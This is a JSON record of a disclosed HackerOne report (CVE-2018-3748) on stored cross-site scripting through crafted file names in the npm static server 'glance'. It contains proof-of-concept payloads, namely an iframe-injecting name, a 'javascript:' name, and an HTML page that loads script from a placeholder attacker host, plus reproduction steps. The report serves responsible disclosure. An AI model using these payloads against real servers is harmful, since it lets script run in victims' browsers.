@@ -1,0 +1,139 @@
+{
+  "id": 310133,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTAxMzM=",
+  "url": "https://hackerone.com/reports/310133",
+  "title": "[glance] Stored XSS via file name allows to run arbitrary JavaScript when directory listing is displayed in browser",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-29T13:29:06.051Z",
+  "submitted_at": "2018-01-29T13:29:06.051Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3748"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-04-15T18:32:20.408Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-04-08T19:57:27.120Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\nThere is a Stored XSS vulnerability in ```glance``` module. File name, which contains malicious HTML (eg. embedded ```iframe``` element or ```javascript:``` pseudoprotocol handler in ```<a>``` element) allows to execute JavaScript code against any user who opens directory listing contains such crafted file name. \n\n## Module\n\n**glance**\n\na quick disposable http server for static files\n\nhttps://www.npmjs.com/package/glance\n\nStats\n33 downloads in the last day\n34 downloads in the last week\n269 downloads in the last month\n\n~3000 estimated downloads per year\n\n## Description\n\n```glance``` serves files from the server where was installed. Because there is no file names sanitization, following names can be used:\n\n- example file name 1: iframe element serving HTML file with malicious JavaScript fired when iframe loads its content:\n\n```\n\"><iframe=\"malicious_frame.html\">\n```\n\n```malicious_iframe.html``` example:\n\n```HTML\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n\n    <script type=\"text/javascript\" src=\"http://attacker.server/malware.js\"></script>\n</body>\n\n</html>\n```\n\n- example file name 2: inline ```javascript:``` pseudo protocol event handler:\n\n```\njavascript:alert('you are pwned!')\n```\n\nWhen user clicks on this file, instead of seeing its content, malicious JavaScript is executed\n\n\n\n## Steps To Reproduce:\n\n- install ```glance```:\n\n```\n$ npm install glance\n```\n\n- in directory which will be served via ```glance```, put file with following name:\n\n\n```\njavascript:alert('you are pwned!')\n```\n\n- run ```glance``` in selected direcotry:\n\n```\nme:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./\n```\n\nYou will see list of files. Now, click file with ```javascript:alert('you are pwned!')``` name.\nJavaScript is executed and popup is fired:\n\n{F258419}\n\n\n## Supporting Material/References:\n\n- Ubuntu 16.04 LTS\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.4 LTS\n- npm version: 5.6.0\n- curl 7.47.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability can be used by attacker to serve malicious JavaScript against any user.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 258419,
+      "file_name": "glancexss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/258/419/5b0192d217a6f157bed646e56de7f937dc5d7dab/glancexss.png?response-content-disposition=attachment%3B%20filename%3D%22glancexss.png%22%3B%20filename%2A%3DUTF-8%27%27glancexss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVGEMB3M2%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T024401Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDkIiWpI5dRdasE%2BpswjiZVlugSME%2FJ009bswcwoKGQMgIhANQ3BFYmHDQfoCyGgPjaMwBadQ2WExGsYa5M%2BN9%2FDeofKrsFCKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzOi%2BwS7Tnqog6s9ygqjwVD1RtnLZ5Lpwc7uaBI0hIdc60%2FxDZBqePbqXgQ0zKfyp04SGVBQ6ylcJ1YHNWXkwJ3n2PPm6wt2nvgkHZgpueWuW6oJxT5aIJJoYpoBsZURwj8Zlew5sd7UyYRCvsG9gchen1xfJVA9A8%2BTS4hhKXe4yePFzaJ3QgoTlLVIAd5YqktZTrsg0y9P4fFbuaWeWVo1elDL1nalZsJJ2JYMXUm4gpB1MSRi%2BxtoaCbijiL%2BZJh8m0w4AVJCZsj%2BPz%2Fm3BFcvhLsXKEe34Stn6L%2FKHBfQkz7Tq%2B44WcW9hp68FHoUvpNyqgV01hXPviAbJS3oeo4w6I0enZepK5Nlqb%2FpbcnlkvOyNEPGGgfZtxsKrofSt2dor6qCx%2F7Iu5Y32RepvxlPfkgdjpQfDBP8A4LB%2F5ABI2iL5whn9SFWeHKn2E9AkHg%2Blor8Rg1rlKEKFSJHGQldD5p%2FmqNiL7WX9QWiqqk87QWeBKDVLeAVNTgr13Cueqvaa0QVOP4WmWuMn29mOFX4LX2SDiZVPjd5saZWsLKwOSArtQzFEl%2Bo5HlfkNaYN6xOpe7VuDDhrrwCjs97L%2FOjtkOn9imUPGM3bktbThiG4aNSAAypzejrG%2F0Q2Ihcd0Xn7lhzKX%2BHPCsN7fUw%2BG5lOatuJNp6Wz6%2F82BiWUke9pOosV485YijVR2cl4e%2FFfnOQcrMqs2jMLO5PuI2DPEKz5yj8%2BC7g9CeW0kiRrJhUD9POYwhK3Sm4aeqptHPjirAOn7CEahKg382rFHHyphiRvHUG2GF5N46QBO3de2TA7pRxrEP01TOGLzin8rwGKKwWG2BWKovc2MdXfTE%2F7le0PMvlO3v60IvNoIoECWmwLbISt1WStT%2BX7uIBDMOrm48wGOrABMtQsGlC7aicjBKSMFO9lF%2Bd2wrjiitfdld3jsmC4obUypwwJVoTZzf2pCrXD9yRHYKbKvN3bYu4m1VZOlMVdC8eCCxmxec4eKg5aretx3w4uCaEv%2B8k7RyPAKD6Ba8KN8xWbtiJpgxewJX1Ujtx7WSBVixlq3UEMoTxbxCCcB%2FfcMfAjDIMqS1Uz9ZzQyAyF150blBsk8zPFOvXXHz8j7z9y3nhtNlNl6iMuyuC%2FqzA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=24564d80d48b36d2333b45b7dcf2fe1719d2e4ba182fecfbbd9b93fe3bad6a58",
+      "file_size": 121897,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-05-08T19:57:27.249Z",
+  "allow_singular_disclosure_after": -245832394.4803825,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "whitesector",
+    "eveeez",
+    "x1m",
+    "khalooda0x"
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.9,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 6772,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "glance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
